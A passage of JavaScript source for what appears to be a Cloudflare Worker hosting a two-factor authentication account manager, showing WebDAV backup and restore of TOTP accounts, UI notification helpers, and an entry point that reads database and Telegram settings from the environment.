        folder:folder,
        data:JSON.stringify(backupData,null,2)
      })
    });
    
    const data=await response.json();
    
    if(data.success){
      statusEl.textContent=data.message;
      statusEl.className='webdav-status success';
      saveWebDAVConfig();
      showNotification('✅ WebDAV 备份成功');
    }else{
      statusEl.textContent='❌ '+data.error;
      statusEl.className='webdav-status error';
      showNotification('❌ WebDAV 备份失败');
    }
  }catch(error){
    statusEl.textContent='❌ 上传失败: '+error.message;
    statusEl.className='webdav-status error';
    showNotification('❌ WebDAV 备份失败');
  }
}

async function downloadFromWebDAV(){
  if(!currentUser){
    showNotification('❌ 请先登录');
    return;
  }
  
  const url=document.getElementById('webdavUrl').value.trim();
  const username=document.getElementById('webdavUsername').value.trim();
  const password=document.getElementById('webdavPassword').value;
  const folder=document.getElementById('webdavFolder').value.trim();
  const statusEl=document.getElementById('webdavStatus');
  
  if(!url||!username||!password){
    statusEl.textContent='❌ 请填写完整的 WebDAV 配置';
    statusEl.className='webdav-status error';
    statusEl.style.display='block';
    return;
  }
  
  statusEl.textContent='🔄 正在从 WebDAV 恢复...';
  statusEl.className='webdav-status info';
  statusEl.style.display='block';
  
  try{
    const response=await fetch('/api/webdav-download',{
      method:'POST',
      headers:{
        'Content-Type':'application/json',
        'Authorization':'Bearer ' + sessionToken
      },
      body:JSON.stringify({url:url,username:username,password:password,folder:folder})
    });
    
    const result=await response.json();
    
    if(result.success){
      const data=JSON.parse(result.data);
      const accounts=data.accounts||[];
      
      for(const acc of accounts){
        await fetch('/api/save-account',{
          method:'POST',
          headers:{
            'Content-Type':'application/json',
            'Authorization':'Bearer ' + sessionToken
          },
          body:JSON.stringify({
            accountName:acc.name,
            secret:acc.secret,
            issuer:acc.issuer||''
          })
        });
      }
      
      await loadSavedAccounts();
      statusEl.textContent='✅ 成功恢复 ' + accounts.length + ' 个账号';
      statusEl.className='webdav-status success';
      showNotification('✅ 从 WebDAV 恢复了 ' + accounts.length + ' 个账号');
      saveWebDAVConfig();
    }else{
      statusEl.textContent='❌ '+result.error;
      statusEl.className='webdav-status error';
      showNotification('❌ WebDAV 恢复失败');
    }
  }catch(error){
    statusEl.textContent='❌ 恢复失败: '+error.message;
    statusEl.className='webdav-status error';
    showNotification('❌ WebDAV 恢复失败');
  }
}

function showNotification(message){
  const notification=document.createElement('div');
  notification.className='notification';
  notification.textContent=message;
  document.body.appendChild(notification);
  setTimeout(()=>notification.remove(),3000);
}

function escapeHtml(text){
  const div=document.createElement('div');
  div.textContent=text;
  return div.innerHTML;
}
</script>
</body>
</html>`;

export default {
  async fetch(request, env) {
    if (env.DB) globalThis.DB = env.DB;
    if (env.TELEGRAM_BOT_TOKEN) globalThis.TELEGRAM_BOT_TOKEN = env.TELEGRAM_BOT_TOKEN;
    if (env.TELEGRAM_CHAT_ID) globalThis.TELEGRAM_CHAT_ID = env.TELEGRAM_CHAT_ID;
    return handleRequest(request);
  }
};
